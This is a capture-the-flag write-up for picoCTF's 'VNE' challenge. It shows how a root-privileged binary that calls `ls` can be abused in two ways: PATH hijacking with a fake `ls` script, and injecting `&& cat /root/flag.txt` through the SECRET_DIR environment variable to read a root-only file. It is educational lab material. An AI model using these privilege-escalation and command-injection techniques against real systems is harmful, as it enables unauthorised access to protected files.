# VNE
Challenge Description:
> We've got a binary that can list directories as root, try it out !!

CTF: <b>picoCTF</b> (picoGym)<br>Difficulty: <b>Medium</b>

<b>[Jump to solution](#solution)</b>

## Hints
Here are the hints provided by the challenge author.
<details>
<summary>Hint 1</summary>

> Have you checked the content of the /root folder
</details>
<details>
<summary>Hint 2</summary>

> Find a way to add more instructions to the ls
</details>
<br>
Here's a hint from me for those needing more of a lead - though this doesn't seem to be the intended solution.
<details>
<summary>Hint 3</summary>

> There might be other, more important environment variables of interest... try running the `env` or `/bin/env` command to see them all
</details>

## Procedure
When logging into the target and running the `bin` binary, we get an error:
```
ctf-player@pico-chall$ ls
bin
ctf-player@pico-chall$ ./bin
Error: SECRET_DIR environment variable is not set
```
So we can set our SECRET_DIR environment variable using `export SECRET_DIR=[directory]` and rerun the binary.
```
ctf-player@pico-chall$ export SECRET_DIR=.
ctf-player@pico-chall$ ./bin
Listing the content of . as root: 
bin
ctf-player@pico-chall$ export SECRET_DIR=/root
ctf-player@pico-chall$ ./bin
Listing the content of /root as root: 
flag.txt
```
It looks like the binary simply runs `ls` on whatever directory we have `SECRET_DIR` set to. Additionally (as per the challenge description) it does this with the permissions of `root`, so we can run `ls` on any directory we wish.

The binary more than likely runs `ls` by simply calling `ls`, and not via an absolute path like `/bin/ls`. So, we can try making our own custom `ls` in our directory and modifying our `PATH` environment variable to manipulate `bin` into calling our `ls`.
```
ctf-player@pico-chall$ cat << exit > ls
> #!/bin/bash
> /bin/cat /root/flag.txt
> exit
ctf-player@pico-chall$ export PATH=.
```
After totally remembering to run `/bin/chmod` to make the custom `ls` executable, we get the flag.
```
ctf-player@pico-chall$ ./bin
Listing the content of /root as root: 
hammy{u win - hammy}
```

## Solution
1. Create a custom `ls` executable in the current directory that runs `/bin/cat /root/flag.txt`. Ensure it is executable using `chmod`.
    - Check the procedure above for how to create the executable.
2. Set your `PATH` environment variable to only contain the current directory by running `export PATH=.`
3. Run `./bin`.

Alternate/Easier Solution: Set SECRET_DIR to run an additional command to `cat /root/flag.txt` by using the `&&` operator: `export SECRET_DIR=". && cat /root/flag.txt"`

## Key Takeaways
I was curious about the challenge author's hints because they didn't really suggest using my solution (I didn't really use any "injection"), so I looked online for other writeups for this challenge. 

It looks like you can extend the `SECRET_DIR` environment variable to include additional commands to be run. This makes sense because `bin` likely just runs something like `ls $(SECRET_DIR)`, meaning `SECRET_DIR=". && cat /root/flag.txt"` would expand into `ls . && cat /root/flag.txt`.

So yeah. Depending on how environment variables are used as input to an binary, they can be another attack vector.